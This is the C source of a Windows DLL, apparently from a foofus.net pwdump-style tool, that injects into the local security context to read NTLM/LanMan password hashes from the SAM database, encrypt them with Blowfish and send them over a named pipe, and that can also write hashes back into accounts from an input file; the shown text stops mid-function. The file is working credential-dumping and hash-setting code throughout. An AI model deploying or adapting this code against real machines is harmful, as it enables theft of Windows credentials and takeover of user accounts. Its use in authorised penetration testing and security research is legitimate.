/*
Copyright ©2009 foofus.net

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License Version 2, as published
by the Free Software Foundation.

This program is distributed in the hope that it will be useful, but WITHOUT
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
FITNESS FOR A PARTICULAR PURPOSE.  The program may contain errors that
could cause failures or loss of data, and may be incomplete or contain
inaccuracies.  By using the program, you expressly acknowledge and agree
that use of the program, or any portion thereof, is at your sole and entire
risk.  You are solely responsible for determining the appropriateness of
using, copying, distributing and modifying the program and assume all risks
of exercising your rights under the license, compliance with all applicable
laws, damage to or loss of data, programs or equipment, and unavailability
or interruption of operations.   THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
EXPRESSLY DISCLAIM ALL WARRANTIES AND/OR CONDITIONS, EXPRESS OR IMPLIED,
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES AND/OR CONDITIONS OF
MERCHANTABILITY, OF SATISFACTORY QUALITY, OF FITNESS FOR A PARTICULAR
PURPOSE, OF ACCURACY, OF QUIET ENJOYMENT, AND NONINFRINGEMENT OF THIRD
PARTY RIGHTS.  THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES DO NOT WARRANT
AGAINST INTERFERENCE WITH YOUR ENJOYMENT OF THE PROGRAM, THAT THE FUNCTIONS
CONTAINED IN THE PROGRAM WILL MEET YOUR NEEDS, THAT THE OPERATION OF THE
PROGRAM WILL BE UNINTERRUPTED OR ERROR-FREE, OR THAT DEFECTS IN THE PROGRAM
WILL BE CORRECTED. THE DISCLAIMER OF WARRANTY CONSTITUTES AN ESSENTIAL PART
OF THE LICENSE TO USE THE PROGRAM AND NO USE OF THE PROGRAM IS AUTHORIZED
EXCEPT UNDER THE DISCLAIMER.  ALSO, SOME JURISDICTIONS DO NOT ALLOW THE
EXCLUSION OR LIMITATION OF INCIDENTAL OR CONSEQUENTIAL DAMAGES, SO THAT
EXCLUSION AND LIMITATION MAY NOT APPLY TO YOU.  See the GNU General Public
License Version 2 for more details.

You should have received a copy of the GNU General Public License Version 2
along with this program; if not, write to the Free Software Foundation, 59
Temple Place, Suite 330, Boston, MA 02111-1307 USA.

*/

#define _WIN32_WINNT 0x0500
#define USER_BUFFER_LENGTH 256
#define BUFFER_SIZE		1000

#include <stdio.h>
#include <windows.h>
#include <winnt.h>
#include <ntsecapi.h>

#include <Lmaccess.h>
#include <Lmapibuf.h>

#include "blowfish.h"
#include "BlowfishStringConvert.h"

// Visual Studio 2005 displays security warnings. This disables display of those warnings so the build 
// experience is like that with earlier DevStudio 6.
#pragma warning(disable : 4996)

DECLARE_HANDLE(HUSER);
DECLARE_HANDLE(HSAM);
DECLARE_HANDLE(HDOMAIN);

typedef struct _sam_user_info 
{
    DWORD rid;
    LSA_UNICODE_STRING name;
} SAM_USER_INFO;

typedef struct _sam_user_enum 
{
    DWORD count;
    SAM_USER_INFO *users;
} SAM_USER_ENUM;

typedef struct _USERINFO
{
	char cHash[64];		// Stores NTLM and LanMan hash data
	wchar_t wszUser[256];	// Stores the user's name
} USERINFO, *LPUSERINFO;

#define SAM_USER_INFO_PASSWORD_OWFS 0x12
#define SAM_HISTORY_COUNT_OFFSET 0x3c
#define SAM_HISTORY_NTLM_OFFSET 0x3c

// Samsrv functions
typedef NTSTATUS (WINAPI *SamIConnectFunc) (DWORD, HSAM*, DWORD, DWORD);
typedef NTSTATUS (WINAPI *SamrOpenDomainFunc) (HSAM, DWORD dwAccess, PSID, HDOMAIN*);
typedef NTSTATUS (WINAPI *SamrOpenUserFunc) (HDOMAIN, DWORD dwAccess, DWORD, HUSER*);
typedef NTSTATUS (WINAPI *SamrEnumerateUsersInDomainFunc) (HDOMAIN, DWORD*, DWORD, SAM_USER_ENUM**, DWORD, PVOID);
typedef NTSTATUS (WINAPI *SamrQueryInformationUserFunc) (HUSER, DWORD, PVOID);
typedef NTSTATUS (WINAPI *SamrSetInformationUserFunc) (HUSER, DWORD, PVOID);
typedef HLOCAL   (WINAPI *SamIFree_SAMPR_USER_INFO_BUFFERFunc) (PVOID, DWORD);
typedef HLOCAL   (WINAPI *SamIFree_SAMPR_ENUMERATION_BUUFERFunc) (SAM_USER_ENUM*);
typedef NTSTATUS (WINAPI *SamrCloseHandleFunc) (HANDLE*);
typedef NTSTATUS (WINAPI *SamIGetPrivateData_t) (HUSER, DWORD *, DWORD *, DWORD *, PVOID *);
typedef NTSTATUS (WINAPI *SystemFunction025_t) (PVOID, DWORD*, BYTE[32] );
typedef NTSTATUS (WINAPI *SystemFunction027_t) (PVOID, DWORD*, BYTE[32] );

//  Samsrv function pointers
static SamIConnectFunc pSamIConnect = NULL;
static SamrOpenDomainFunc pSamrOpenDomain = NULL;
static SamrOpenUserFunc pSamrOpenUser = NULL;
static SamrQueryInformationUserFunc pSamrQueryInformationUser = NULL;
static SamrSetInformationUserFunc pSamrSetInformationUser = NULL;
static SamrEnumerateUsersInDomainFunc pSamrEnumerateUsersInDomain = NULL;
static SamIFree_SAMPR_USER_INFO_BUFFERFunc pSamIFree_SAMPR_USER_INFO_BUFFER = NULL;
static SamIFree_SAMPR_ENUMERATION_BUUFERFunc pSamIFree_SAMPR_ENUMERATION_BUFFER = NULL;
static SamrCloseHandleFunc pSamrCloseHandle = NULL;
static SamIGetPrivateData_t pSamIGetPrivateData = NULL;
static SystemFunction025_t pSystemFunction025 = NULL;
static SystemFunction027_t pSystemFunction027 = NULL;

static HANDLE hPipe = NULL; 
static BOOL bDoHistoryDump = TRUE;
BYTE* pSecretKey = NULL;
BLOWFISH_CTX ctx;

BOOL InitializePipe(LPCTSTR lpszPipe)
{
	char szPipeName[MAX_PATH];

	memset(szPipeName, 0, MAX_PATH);
	_snprintf(szPipeName, MAX_PATH, "\\\\.\\pipe\\%s", lpszPipe);
	
    hPipe = CreateNamedPipe(szPipeName, 
                            PIPE_ACCESS_DUPLEX, // read/write access 
                            PIPE_TYPE_MESSAGE | // message type pipe 
                            PIPE_READMODE_MESSAGE | // message-read mode 
                            PIPE_WAIT, // blocking mode 
                            PIPE_UNLIMITED_INSTANCES, // max. instances 
                            BUFFER_SIZE, // output buffer size 
                            BUFFER_SIZE, // input buffer size 
                            10000, // client time-out 
                            NULL); // no security attribute 

	if (hPipe == INVALID_HANDLE_VALUE) 
	{
        return FALSE;
	}

	return TRUE;

    return ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED || GetLastError() == ERROR_PIPE_LISTENING); 
}

BOOL ResetPipe()
{
	if (hPipe != NULL && hPipe != INVALID_HANDLE_VALUE)
	{
		DisconnectNamedPipe(hPipe);
		return ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED || GetLastError() == ERROR_PIPE_LISTENING); 
	}
	else
		return FALSE;
}

// Functions to send stuff down the pipe
void SendStatusMessage(char* szMessage, ...)
{
	USERINFO info;
	char* szData = (char*)malloc(BUFFER_SIZE);
	wchar_t wszTmp[BUFFER_SIZE + 1];
	char header[3] = { 0x03, 0x00, 0x00 };		// Header for a status message
	va_list ap;
	wchar_t* buf;
	long cbTotalBytes;
	int nLen;
  
	if (szMessage == NULL) 
	{
		return;
	}

	MultiByteToWideChar(CP_ACP, 0, szMessage, strlen(szMessage) + 1, wszTmp, sizeof(wszTmp) / sizeof(wszTmp[0]));

	va_start(ap, szMessage);
	nLen = BUFFER_SIZE;

	buf = (wchar_t*)malloc(nLen + 1);
	memset(buf, 0, nLen + 1);
	_vsnwprintf(buf, nLen, wszTmp, ap);

	_snwprintf(info.wszUser, 255, buf);
	header[2] = 0;

	memset(szData, 0, BUFFER_SIZE);
	memcpy(szData, header, 3);
	memcpy(szData + 3, &info, sizeof(USERINFO));

	if (hPipe != NULL && hPipe != INVALID_HANDLE_VALUE)
	{
		WriteFile(hPipe, szData, sizeof(USERINFO) + 3, &cbTotalBytes, NULL);
		FlushFileBuffers(hPipe); 
		ResetPipe();
	}

	va_end(ap);
	free(buf);
	free(szData);
}

void SendUserData(char cHashData[32], wchar_t* wszUser)
{
	USERINFO info;
	char* szData = (char*)malloc(BUFFER_SIZE);
	char header[3] = { 0x02, 0x00, 0x00 };		// Header for a user message
	long cbTotalBytes;
	char temp[64];
	int nBlockLen;
	int i;
	DWORD dwDataChunk1, dwDataChunk2;

	// Blowfish encrypts 64 bits at a time. As such, data is broken up into
	// 2 data chunks (4 bytes each) and encrypted

	// Encrypt and copy hash data to structure
	memset(temp, 0, 64);
	memcpy(temp, cHashData, 32);
	for (i = 0; i < 4; i++)
	{
		//dwDataChunk1 = (unsigned long)(temp + (i * 8));
		//dwDataChunk2 = (unsigned long)(temp + (i * 8) + 4);

		ConvertToBlowfishLongs(temp + (i * 8), &dwDataChunk1, &dwDataChunk2);
		Blowfish_Encrypt(&ctx, &dwDataChunk1, &dwDataChunk2);
		memcpy(info.cHash + (i * 8), &dwDataChunk1, 4);
		memcpy(info.cHash + (i * 8) + 4, &dwDataChunk2, 4);
	}

	// Copy encrypted user name to structure
	nBlockLen = (int)(((wcslen(wszUser) + 1) * sizeof(wszUser[0])) / 8);
	for (i = 0; i <= nBlockLen; i++)
	{
		//dwDataChunk1 = (unsigned long)(szUser + (i * 8));
		//dwDataChunk2 = (unsigned long)(szUser + (i * 8) + 4);

		// Remember that adding to wchar types increments the pointer by 2!
		ConvertToBlowfishLongsWide(wszUser + (i * 4), &dwDataChunk1, &dwDataChunk2);
		Blowfish_Encrypt(&ctx, &dwDataChunk1, &dwDataChunk2);
		memcpy(info.wszUser + (i * 4), &dwDataChunk1, 4);
		memcpy(info.wszUser + (i * 4) + 2, &dwDataChunk2, 4);

		/*memset(temp, 0, 64);
		_snprintf(temp, 64, szUser + (i * 64));
		Blowfish_Encrypt(&ctx, (unsigned long*)&temp, (unsigned long*)&(temp[32]));
		memcpy(info.szUser + (i * 64), temp, 64);*/
	}

	header[2] = nBlockLen + 1;	// Number of blocks that were encrypted

	memset(szData, 0, BUFFER_SIZE);
	memcpy(szData, header, 3);
	memcpy(szData + 3, &info, sizeof(USERINFO));

	if (hPipe != NULL && hPipe != INVALID_HANDLE_VALUE)
	{
		WriteFile(hPipe, szData, sizeof(USERINFO) + 3, &cbTotalBytes, NULL);
		FlushFileBuffers(hPipe); 
		ResetPipe();
	}

	free(szData);
}

void SendTerminationSignal()
{
	long cbTotalBytes;
	char header[3] = { 0x00, 0x00, 0x00 };
	if (hPipe != NULL && hPipe != INVALID_HANDLE_VALUE)
	{
		WriteFile(hPipe, header, 3, &cbTotalBytes, NULL);
		FlushFileBuffers(hPipe); 
		//ResetPipe();

		// If we're terminating, don't reset the pipe, just close it				
		DisconnectNamedPipe(hPipe);
	}
}

__declspec(dllexport)GetHash(LPCTSTR lpszPipeName, char *szCurrentDirectory, BYTE* pEncryptionKey, DWORD dwKeyLen, BOOL bSkipHistories)
{
    LSA_OBJECT_ATTRIBUTES attributes;
    LSA_HANDLE hLsa = 0;
    PLSA_UNICODE_STRING pSysName = NULL;
    POLICY_ACCOUNT_DOMAIN_INFO* pDomainInfo;
    NTSTATUS rc;
    HSAM hSam = 0;
    HDOMAIN hDomain = 0;
    HUSER hUser = 0;
    DWORD dwEnum = 0;
    HINSTANCE hSamsrv = NULL;
	HINSTANCE hAdvapi32 = NULL;
    DWORD ret = 1;
	char InputFile[MAX_PATH+1];
	FILE* stream;
    CHAR data[1024];
	DWORD rid;
	
	// Start the named pipe
	if (!InitializePipe(lpszPipeName))
	{
		goto exit;
	}

	SendStatusMessage("Starting...");
	//SendStatusMessage("Using pipe %s", lpszPipeName);
	//SendStatusMessage("Key length is %d", dwKeyLen);
	
	pSecretKey = malloc(dwKeyLen);
	memcpy(pSecretKey, pEncryptionKey, dwKeyLen);

	if (bSkipHistories)
		bDoHistoryDump = FALSE;

	Blowfish_Init(&ctx, pSecretKey, dwKeyLen);

	// Get Sam functions
	hSamsrv = LoadLibrary("samsrv.dll");
	hAdvapi32 = LoadLibrary("advapi32.dll");

	pSamIConnect = (SamIConnectFunc)GetProcAddress(hSamsrv, "SamIConnect");
	pSamrOpenDomain = (SamrOpenDomainFunc)GetProcAddress(hSamsrv, "SamrOpenDomain");
	pSamrOpenUser = (SamrOpenUserFunc)GetProcAddress(hSamsrv, "SamrOpenUser");
	pSamrQueryInformationUser = (SamrQueryInformationUserFunc)GetProcAddress(hSamsrv, "SamrQueryInformationUser");
	pSamrEnumerateUsersInDomain = (SamrEnumerateUsersInDomainFunc)GetProcAddress(hSamsrv, "SamrEnumerateUsersInDomain");
	pSamIFree_SAMPR_USER_INFO_BUFFER = (SamIFree_SAMPR_USER_INFO_BUFFERFunc)GetProcAddress(hSamsrv, "SamIFree_SAMPR_USER_INFO_BUFFER");
	pSamIFree_SAMPR_ENUMERATION_BUFFER = (SamIFree_SAMPR_ENUMERATION_BUUFERFunc)GetProcAddress(hSamsrv, "SamIFree_SAMPR_ENUMERATION_BUFFER");
	pSamrCloseHandle = (SamrCloseHandleFunc)GetProcAddress(hSamsrv, "SamrCloseHandle");
	pSamIGetPrivateData = (SamIGetPrivateData_t)GetProcAddress(hSamsrv, "SamIGetPrivateData");
	pSystemFunction025 = (SystemFunction025_t)GetProcAddress(hAdvapi32, "SystemFunction025");
	pSystemFunction027 = (SystemFunction027_t)GetProcAddress(hAdvapi32, "SystemFunction027");

	if( !pSamIConnect || !pSamrOpenDomain || !pSamrOpenUser || !pSamrQueryInformationUser 
		|| !pSamrEnumerateUsersInDomain || !pSamIFree_SAMPR_USER_INFO_BUFFER 
		|| !pSamIFree_SAMPR_ENUMERATION_BUFFER || !pSamrCloseHandle)
	{
		SendStatusMessage("Target: Failed to load SAM functions.");
		goto exit;
	}

	if( !pSamIGetPrivateData || !pSystemFunction025 || !pSystemFunction027 )
	{
		//SendStatusMessage("Target: Could not load password history functions. Password histories will not be available.");
		// SendStatusMessage("No history available");
		bDoHistoryDump = FALSE;
	}


	// Open the Policy database
	memset(&attributes, 0, sizeof(LSA_OBJECT_ATTRIBUTES));
	attributes.Length = sizeof(LSA_OBJECT_ATTRIBUTES);

	// Get policy handle
	rc = LsaOpenPolicy(pSysName, &attributes, POLICY_ALL_ACCESS, &hLsa);
	if(rc < 0)
	{
		//SendStatusMessage("Target: LsaOpenPolicy failed: 0x%08x", rc);
		SendStatusMessage("Error 1: 0x%08x", rc);
		goto exit;
	}

	// Get Domain Info
	rc = LsaQueryInformationPolicy(hLsa, PolicyAccountDomainInformation, (void**)&pDomainInfo);
	if(rc < 0)
	{
		//SendStatusMessage("Target: LsaQueryInformationPolicy failed: 0x%08x", rc);
		SendStatusMessage("Error 2: 0x%08x", rc);
		goto exit;
	}
 
	// Connect to the SAM database
	rc = pSamIConnect(0, &hSam, MAXIMUM_ALLOWED, 1);
	if(rc < 0)
	{
		//SendStatusMessage("Target: SamIConnect failed: 0x%08x", rc);
		SendStatusMessage("Error 3: 0x%08x", rc);
		goto exit;
	}

	rc = pSamrOpenDomain(hSam, 0xf07ff, pDomainInfo->DomainSid, &hDomain);
	if( rc < 0 )
	{
		//SendStatusMessage("Target: SamrOpenDomain failed: 0x%08x", rc);
		SendStatusMessage("Error 4: 0x%08x", rc);
		hDomain = 0;
		goto exit;
	}

	strcpy(InputFile, szCurrentDirectory);
	strcat(InputFile, "\\copypwd.in.txt");

	if ((stream = fopen(InputFile, "r")) != NULL) 
	{
		wchar_t wszTemp[USER_BUFFER_LENGTH];
		BYTE  hashData[64];
		DWORD dwSize;
		PVOID pHashData = 0, pHistRec = 0;
		DWORD dw1, dw2;
				
		ZeroMemory(data, sizeof (data));
		/* read the RID */
		if (fgets(data, sizeof(data), stream) == NULL) {
			ret=3;
			goto exit;
		}

		rid = strtoul ( data, NULL, 10 );
		// Open the user (by Rid)
				rc = pSamrOpenUser(hDomain, MAXIMUM_ALLOWED, rid, &hUser);
				if(rc < 0)
				{
					//SendStatusMessage("Target: SamrOpenUser failed: 0x%08x", rc);
					SendStatusMessage("Error 5: 0x%08x", rc);
					goto exit;
				}

				// Get the password OWFs
				rc = pSamrQueryInformationUser(hUser, SAM_USER_INFO_PASSWORD_OWFS, &pHashData);
				if (rc < 0)
				{
					//SendStatusMessage("Target: SamrQueryInformationUser failed: 0x%08x", rc);
					SendStatusMessage("Error 6: 0x%08x", rc);
					pSamrCloseHandle(&hUser);
					hUser = 0;
					goto exit;
				}

				// Convert the username and rid
				/*dwSize = min(USER_BUFFER_LENGTH, pEnum->users[i].name.Length >> 1);
				if (WideCharToMultiByte(CP_UTF8, 0, pEnum->users[i].name.Buffer, dwSize, szOrigUserName, sizeof(szOrigUserName), NULL, NULL) <= 0)
 					strcpy(szOrigUserName, "PwDumpError");
 
				if (_snprintf_s(szUserName, sizeof(szUserName) / sizeof(szUserName[0]), sizeof(szUserName) / sizeof(szUserName[0]), "%s:%d", szOrigUserName, pEnum->users[i].rid) <= 0)
					strcpy(szUserName, "PwDumpError:999999");*/

				// Using Unicode to support non-ASCII user names
				// Length variable is in bytes
				
				// wszTemp = NULL;

					//wcscpy(wszUserName, L"PwDumpError:999999");

				// Send the user data
				memcpy(hashData, pHashData, 32);
				_snwprintf(wszTemp, 10, L"%d", rid);
				// sprintf(wszTemp, "%d", rid);
				SendUserData(hashData, wszTemp);

				// Free stuff
				pSamIFree_SAMPR_USER_INFO_BUFFER(pHashData, SAM_USER_INFO_PASSWORD_OWFS);
				pHashData = NULL;

				dw1 = 2;
				dw2 = 0;
				dwSize = 0;


				pSamrCloseHandle(&hUser);
				hUser = 0;

		fclose(stream);
	}

#if 0
	do
	{
		enumRc = pSamrEnumerateUsersInDomain(hDomain, &dwEnum, 0, &pEnum, 1000, &dwNumber);
		if(enumRc == 0 || enumRc == 0x105)
		{
			for(i = 0; i < (int)dwNumber; i++)
			{
				wchar_t wszUserName[USER_BUFFER_LENGTH];
				wchar_t* wszTemp = NULL;	// This is needed since it seems like the SUPPORT_XXX account has trailing garbage
				BYTE  hashData[64];
				DWORD dwSize;
				PVOID pHashData = 0, pHistRec = 0;
				DWORD dw1, dw2;
				DWORD dwCounter, dwOffset;
				int j;

				memset(wszUserName, 0, USER_BUFFER_LENGTH * sizeof(wszUserName[0]));
				//memset(szOrigUserName, 0, USER_BUFFER_LENGTH);
				memset(hashData, 0, 64);
				
				// Open the user (by Rid)
				rc = pSamrOpenUser(hDomain, MAXIMUM_ALLOWED, pEnum->users[i].rid, &hUser);
				if(rc < 0)
				{
					//SendStatusMessage("Target: SamrOpenUser failed: 0x%08x", rc);
					SendStatusMessage("Error 5: 0x%08x", rc);
					continue;
				}

				// Get the password OWFs
				rc = pSamrQueryInformationUser(hUser, SAM_USER_INFO_PASSWORD_OWFS, &pHashData);
				if (rc < 0)
				{
					//SendStatusMessage("Target: SamrQueryInformationUser failed: 0x%08x", rc);
					SendStatusMessage("Error 6: 0x%08x", rc);
					pSamrCloseHandle(&hUser);
					hUser = 0;
					continue;
				}

				// Convert the username and rid
				/*dwSize = min(USER_BUFFER_LENGTH, pEnum->users[i].name.Length >> 1);
				if (WideCharToMultiByte(CP_UTF8, 0, pEnum->users[i].name.Buffer, dwSize, szOrigUserName, sizeof(szOrigUserName), NULL, NULL) <= 0)
 					strcpy(szOrigUserName, "PwDumpError");
 
				if (_snprintf_s(szUserName, sizeof(szUserName) / sizeof(szUserName[0]), sizeof(szUserName) / sizeof(szUserName[0]), "%s:%d", szOrigUserName, pEnum->users[i].rid) <= 0)
					strcpy(szUserName, "PwDumpError:999999");*/

				// Using Unicode to support non-ASCII user names
				// Length variable is in bytes
				
				// This is a fix for the trailing garbage on the SUPPORT_whatever account
				wszTemp = (wchar_t*)malloc(pEnum->users[i].name.Length + 2);
				memset(wszTemp, 0, pEnum->users[i].name.Length + 2);
				memcpy(wszTemp, pEnum->users[i].name.Buffer, pEnum->users[i].name.Length);

				//SendStatusMessage("Len %d, Size used: %d, User: %ls\n", pEnum->users[i].name.Length / sizeof(WCHAR), min(pEnum->users[i].name.Length / sizeof(WCHAR), sizeof(wszUserName) / sizeof(wszUserName[0])), wszTemp);
				// 10 characters is extra padding for the RID and ":"
				_snwprintf(wszUserName, min(pEnum->users[i].name.Length + 10 / sizeof(WCHAR), sizeof(wszUserName) / sizeof(wszUserName[0])), L"%ls:%d", wszTemp, pEnum->users[i].rid);
				if (wszTemp != NULL)
					free(wszTemp);

				wszTemp = NULL;

					//wcscpy(wszUserName, L"PwDumpError:999999");

				// Send the user data
				memcpy(hashData, pHashData, 32);
				SendUserData(hashData, wszUserName);

				// Free stuff
				pSamIFree_SAMPR_USER_INFO_BUFFER(pHashData, SAM_USER_INFO_PASSWORD_OWFS);
				pHashData = NULL;

				dw1 = 2;
				dw2 = 0;
				dwSize = 0;

				// Password history dump. Only do this if the functions are available to do it (Vista is different)
				if (bDoHistoryDump)
				{
					memset(hashData, 0, 64);
					rc = pSamIGetPrivateData(hUser, &dw1, &dw2, &dwSize, &pHashData);

					if (rc == 0 && dwSize > 0x3c) 
					{
						pHistRec = pHashData;

						dwCounter = (((BYTE *)pHashData)[SAM_HISTORY_COUNT_OFFSET]) / 16 ;
						dwOffset  = (((BYTE *)pHashData)[SAM_HISTORY_NTLM_OFFSET]);

						if ((dwCounter > 1) && (dwSize > dwOffset + 0x64)) 
						{
							//SendStatusMessage("History counter for %ls is %d, offset is %d", wszUserName, dwCounter, dwOffset);

							for (j = dwCounter; j > 1; j--) 
							{
								pHistRec = (BYTE*)pHistRec += 0x10;

								if (0 != (rc = pSystemFunction025((BYTE *)pHistRec+0x44, &pEnum->users[i].rid, hashData)))
								{
									break;	
								}

								if (0 != (rc = pSystemFunction027((BYTE *)pHistRec+0x44+dwOffset, &pEnum->users[i].rid, hashData+16))) 
								{
									break;
								}
								
								dataSize = 32;
								//ZeroMemory(wszUserName, sizeof(wszUserName));
								// This is a fix for the trailing garbage on the SUPPORT_whatever account
								wszTemp = (wchar_t*)malloc(pEnum->users[i].name.Length + 2);
								memset(wszTemp, 0, pEnum->users[i].name.Length + 2);
								memcpy(wszTemp, pEnum->users[i].name.Buffer, pEnum->users[i].name.Length);

								memset(wszUserName, 0, USER_BUFFER_LENGTH * sizeof(wszUserName[0]));
								
								// 10 characters is extra padding for the RID and ":"
								_snwprintf(wszUserName, min(pEnum->users[i].name.Length + 10 / sizeof(WCHAR), sizeof(wszUserName) / sizeof(wszUserName[0])), L"%ls_history_%d:%d", wszTemp, dwCounter - j, pEnum->users[i].rid);
								//if (_snwprintf_s(wszUserName, sizeof(wszUserName) / sizeof(wszUserName[0]), sizeof(wszUserName) / sizeof(wszUserName[0]), L"%ls_history_%d:%d", pEnum->users[i].name.Buffer, dwCounter - j, pEnum->users[i].rid) <= 0)
								//	wcscpy(wszUserName, L"PwDumpError:999999");

								SendUserData(hashData, wszUserName);
								if (wszTemp != NULL)
									free(wszTemp);

								wszTemp = NULL;
							}
						}

						if (pHashData)
							LocalFree(pHashData);

						pHashData = 0;
					}
				}

				pSamrCloseHandle(&hUser);
				hUser = 0;
	            
			}
			pSamIFree_SAMPR_ENUMERATION_BUFFER(pEnum);
			pEnum = NULL;
		}
		else
		{
			//SendStatusMessage("Target: unable to enumerate domain users: 0x%08x", rc);
			SendStatusMessage("Error 7: 0x%08x", rc);
			goto exit;
		}
	} while(enumRc == 0x105);
#endif

	ret = 0;

exit:
	// Clean up
	SendTerminationSignal();

	if (hPipe != NULL && hPipe != INVALID_HANDLE_VALUE)
		CloseHandle(hPipe);

	if(hUser) 
		pSamrCloseHandle(&hUser);
	if(hDomain) 
		pSamrCloseHandle(&hDomain);
	if(hSam) 
		pSamrCloseHandle(&hSam);
	if(hLsa) 
		LsaClose(hLsa);

	if(hSamsrv) 
		FreeLibrary(hSamsrv);
	if(hAdvapi32) 
		FreeLibrary(hAdvapi32);

    return ret;
}

__declspec(dllexport)SetHash(LPCTSTR lpszPipeName, char *szCurrentDirectory, BYTE* pEncryptionKey, DWORD dwKeyLen, BOOL bSkipHistories)
{
 LSA_OBJECT_ATTRIBUTES attributes;
    LSA_HANDLE hLsa = 0;
    PLSA_UNICODE_STRING pSysName = NULL;
    POLICY_ACCOUNT_DOMAIN_INFO* pDomainInfo;
    NTSTATUS rc;
    HSAM hSam = 0;
    HDOMAIN hDomain = 0;
    HUSER hUser = 0;
    DWORD dwEnum = 0;
    SAM_USER_ENUM *pEnum = NULL;
    HINSTANCE hSamsrv = NULL;
	HINSTANCE hAdvapi32 = NULL;
    int i;
    DWORD ret = 1;
	char InputFile[MAX_PATH+1];

	FILE* stream;

    CHAR data[1024];
	CHAR pwd[32];
	CHAR user[256];
	WCHAR wuser[256];
	CHAR hash[256];

	CHAR PwdByte[3];
	CHAR* pos;
	CHAR* stopstring;
	DWORD NetErr, RID, LineCount;
	PUSER_INFO_3 ui3;
	int delim = ':';
	int intTemp, HashIndex;
	int theRc = 1; // set to fail initially



	
	// Start the named pipe
	if (!InitializePipe(lpszPipeName))
	{
		goto exit;
	}

	SendStatusMessage("Starting...");
	//SendStatusMessage("Using pipe %s", lpszPipeName);
	//SendStatusMessage("Key length is %d", dwKeyLen);
	
	pSecretKey = malloc(dwKeyLen);
	memcpy(pSecretKey, pEncryptionKey, dwKeyLen);

	if (bSkipHistories)
		bDoHistoryDump = FALSE;

	Blowfish_Init(&ctx, pSecretKey, dwKeyLen);

	// Get Sam functions
	hSamsrv = LoadLibrary("samsrv.dll");
	hAdvapi32 = LoadLibrary("advapi32.dll");

	pSamIConnect = (SamIConnectFunc)GetProcAddress(hSamsrv, "SamIConnect");
	pSamrOpenDomain = (SamrOpenDomainFunc)GetProcAddress(hSamsrv, "SamrOpenDomain");
	pSamrOpenUser = (SamrOpenUserFunc)GetProcAddress(hSamsrv, "SamrOpenUser");
	pSamrQueryInformationUser = (SamrQueryInformationUserFunc)GetProcAddress(hSamsrv, "SamrQueryInformationUser");
	pSamrSetInformationUser = (SamrSetInformationUserFunc)GetProcAddress(hSamsrv, "SamrSetInformationUser");
	pSamrEnumerateUsersInDomain = (SamrEnumerateUsersInDomainFunc)GetProcAddress(hSamsrv, "SamrEnumerateUsersInDomain");
	pSamIFree_SAMPR_USER_INFO_BUFFER = (SamIFree_SAMPR_USER_INFO_BUFFERFunc)GetProcAddress(hSamsrv, "SamIFree_SAMPR_USER_INFO_BUFFER");
	pSamIFree_SAMPR_ENUMERATION_BUFFER = (SamIFree_SAMPR_ENUMERATION_BUUFERFunc)GetProcAddress(hSamsrv, "SamIFree_SAMPR_ENUMERATION_BUFFER");
	pSamrCloseHandle = (SamrCloseHandleFunc)GetProcAddress(hSamsrv, "SamrCloseHandle");
	pSamIGetPrivateData = (SamIGetPrivateData_t)GetProcAddress(hSamsrv, "SamIGetPrivateData");
	pSystemFunction025 = (SystemFunction025_t)GetProcAddress(hAdvapi32, "SystemFunction025");
	pSystemFunction027 = (SystemFunction027_t)GetProcAddress(hAdvapi32, "SystemFunction027");

	if( !pSamIConnect || !pSamrOpenDomain || !pSamrOpenUser || !pSamrQueryInformationUser || !pSamrSetInformationUser
		|| !pSamrEnumerateUsersInDomain || !pSamIFree_SAMPR_USER_INFO_BUFFER 
		|| !pSamIFree_SAMPR_ENUMERATION_BUFFER || !pSamrCloseHandle)
	{
		SendStatusMessage("Target: Failed to load SAM functions.");
		goto exit;
	}

	SendStatusMessage("Set user password");

	if( !pSamIGetPrivateData || !pSystemFunction025 || !pSystemFunction027 )
	{
		//SendStatusMessage("Target: Could not load password history functions. Password histories will not be available.");
		// SendStatusMessage("No history available");
		bDoHistoryDump = FALSE;
	}


	// Open the Policy database
	memset(&attributes, 0, sizeof(LSA_OBJECT_ATTRIBUTES));
	attributes.Length = sizeof(LSA_OBJECT_ATTRIBUTES);

	// Get policy handle
	rc = LsaOpenPolicy(pSysName, &attributes, POLICY_ALL_ACCESS, &hLsa);
	if(rc < 0)
	{
		//SendStatusMessage("Target: LsaOpenPolicy failed: 0x%08x", rc);
		SendStatusMessage("Error 1: 0x%08x", rc);
		goto exit;
	}

	// Get Domain Info
	rc = LsaQueryInformationPolicy(hLsa, PolicyAccountDomainInformation, (void**)&pDomainInfo);
	if(rc < 0)
	{
		//SendStatusMessage("Target: LsaQueryInformationPolicy failed: 0x%08x", rc);
		SendStatusMessage("Error 2: 0x%08x", rc);
		goto exit;
	}
 
	// Connect to the SAM database
	rc = pSamIConnect(0, &hSam, MAXIMUM_ALLOWED, 1);
	if(rc < 0)
	{
		//SendStatusMessage("Target: SamIConnect failed: 0x%08x", rc);
		SendStatusMessage("Error 3: 0x%08x", rc);
		goto exit;
	}

	rc = pSamrOpenDomain(hSam, 0xf07ff, pDomainInfo->DomainSid, &hDomain);
	if( rc < 0 )
	{
		//SendStatusMessage("Target: SamrOpenDomain failed: 0x%08x", rc);
		SendStatusMessage("Error 4: 0x%08x", rc);
		hDomain = 0;
		goto exit;
	}

	SendStatusMessage("CurrentDirectory: %S", szCurrentDirectory);
		
	strcpy(InputFile, szCurrentDirectory);
	strcat(InputFile, "\\copypwd.txt");
	SendStatusMessage("File: %S", InputFile);
	LineCount = 0;
	if ((stream = fopen(InputFile, "r")) != NULL)
	{
		while (1)
		{
			ZeroMemory(data, sizeof (data));
			if (fgets(data, sizeof(data), stream) == NULL)
				break;

			LineCount++;
			
			// find where the ":" is in the data for parsing out the user/password
			pos = strchr (data, delim);
		    if (pos == NULL )
			{
				SendStatusMessage( "Unable to parse line from input file : Line # %d\n", LineCount);
				goto exit;
			}

			// initialize everything to zeros
			ZeroMemory(pwd, sizeof (pwd));
			ZeroMemory(user, sizeof (user));
			ZeroMemory(hash, sizeof (hash));
			ZeroMemory(wuser, sizeof (wuser));
			
			// first, copy the username out of the data
			strncpy(user, data, pos - data);
			// convert username to Unicode
